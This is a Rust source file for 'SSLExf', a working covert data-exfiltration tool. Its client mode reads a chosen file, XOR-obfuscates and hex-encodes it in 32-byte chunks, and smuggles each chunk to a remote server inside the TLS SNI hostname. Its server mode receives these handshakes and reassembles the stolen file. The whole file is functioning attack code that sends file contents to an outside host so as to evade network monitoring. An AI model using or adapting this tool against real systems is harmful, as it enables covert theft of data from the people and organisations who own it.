use openssl::ssl::{Ssl, SslAcceptor, SslContext, SslMethod, SslFiletype, NameType};
use std::fs::{File, OpenOptions};
use std::io::prelude::*;
use std::net::{TcpStream, TcpListener};
use std::str;
use rand::{distributions::Alphanumeric, Rng};
use std::io::{Seek, SeekFrom, Read, ErrorKind};
use hex::{encode,decode};
use clap::{Arg, Command};


fn xor(s: &[u8], key: &[u8]) -> Vec<u8> {
	let mut result = Vec::with_capacity(s.len());
	let mut b = key.iter().cycle();
	for byte in s {
		result.push(byte ^ b.next().unwrap());
	}
	result
}

fn exf(chunk: &[u8], server: &str, port: &str, key: &String, ke: &String) {

	let xord_buffer = xor(&chunk, &key.as_bytes());
	let hostname = format!("{}.{}.cnr.io", encode(&xord_buffer), ke);
	let mut ssl_context = SslContext::builder(SslMethod::tls()).unwrap();
	ssl_context.set_alpn_protos(b"\x02h2").unwrap();
	let stream = TcpStream::connect(format!("{}:{}", server, port)).unwrap();
	let mut ssl = Ssl::new(&ssl_context.build()).unwrap();
	ssl.set_hostname(&hostname.as_str()).unwrap();
	ssl.set_connect_state();
	let mut stream = ssl.connect(stream).unwrap();
	stream.shutdown().unwrap();

}



fn main() {

	let matches = Command::new("SSLExf")
            .arg(Arg::new("mode")
	        .short('m')
	        .long("mode")
	        .required(true)
	        .help("Mode with which to run [ client, server ]"))
	    .arg(Arg::new("cert")
                .short('c')
                .long("cert")
	        .required_if_eq("mode", "server")
	        .help("Server mode certificate chain file"))
	    .arg(Arg::new("key")
                .short('k')
                .long("key")
                .required_if_eq("mode", "server")
	        .help("Server mode certificate key file"))
	    .arg(Arg::new("server")
	        .short('s')
	        .long("server")
	        .required(true)
	        .help("Target to bind to (server) || exfiltrate to (client)"))
	    .arg(Arg::new("port")
	        .short('p')
	        .long("port")
	        .required(true)
	        .help("Port to bind to (server) || connect to (client)"))
	    .arg(Arg::new("filename")
	        .short('f')
	        .long("filename")
	        .required_if_eq("mode", "client")
	        .help("File to exfiltrate in client mode"))
        .get_matches();

	let mode = matches.get_one::<String>("mode").unwrap();
	let server = matches.get_one::<String>("server").unwrap();
	let port = matches.get_one::<String>("port").unwrap();

	if mode == "client" {
	
		let filename = matches.get_one::<String>("filename").unwrap();

		let mut file = File::open(&filename).unwrap();

		let ke: String = rand::thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect();
		let key: String = ke.chars().rev().collect();
		if cfg!(windows) {
			let filen = &filename.split("\\").collect::<Vec<&str>>().last().copied().unwrap();		
			exf(format!("SSLexFilNym:{}", &filen).as_bytes(), &server, &port, &key, &ke);
		} else if cfg!(unix) {
			let filen = &filename.split("/").collect::<Vec<&str>>().last().copied().unwrap();		
			exf(format!("SSLexFilNym:{}", &filen).as_bytes(), &server, &port, &key, &ke);
		}

		let mut start: u64 = 0;

		loop {			
			let mut buffer = [0; 32];
			file.seek(SeekFrom::Start(start)).unwrap();
			let mut reader = std::io::BufReader::new(&file);
			match reader.read(&mut buffer) {
				Ok(0) => break, //EOF
				Ok(_n) => {
					exf(&buffer, &server, &port, &key, &ke);
					start += 32;
				},
				Err(e) => match e.kind() {
					ErrorKind::UnexpectedEof => break,
					_ => panic!("File Read Error: {}", e),
				}
			}
		}
	}
			
	if mode == "server" {

		let cert = matches.get_one::<String>("cert").unwrap();
		let key = matches.get_one::<String>("key").unwrap();

		let listener = TcpListener::bind(format!("{}:{}", &server, &port)).unwrap();
		let mut ssl_acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls()).unwrap();
		ssl_acceptor.set_private_key_file(&key, SslFiletype::PEM).unwrap();
		ssl_acceptor.set_certificate_chain_file(&cert).unwrap();
		let ssl_context = ssl_acceptor.build();
		let mut filename = String::from("sslexf.delme");
		for stream in listener.incoming() {
			let mut file = OpenOptions::new().create(true).append(true).open(&filename).unwrap();
			let stream = stream.unwrap();
			let ssl_stream = ssl_context.accept(stream).unwrap();
			let hostname = ssl_stream.ssl().servername(NameType::HOST_NAME).expect("SNI ERROR").split(".").collect::<Vec<&str>>();
			let xor_key = &hostname[1].chars().rev().collect::<String>();
			let key = &xor_key.as_bytes();
			let encoded_data = &hostname[0];
			let decoded_data = decode(&encoded_data).unwrap();
			let plaintext = xor(&decoded_data, &key);			
			let extracted = str::from_utf8(&plaintext).unwrap();
			if extracted.starts_with("SSLexFilNym:") {
				let new_file = extracted.split(":").collect::<Vec<&str>>()[1];
				filename = String::from(new_file.to_owned());
			} else {
				file.write_all(extracted.as_bytes()).unwrap();
			}
		}
	}
	
}
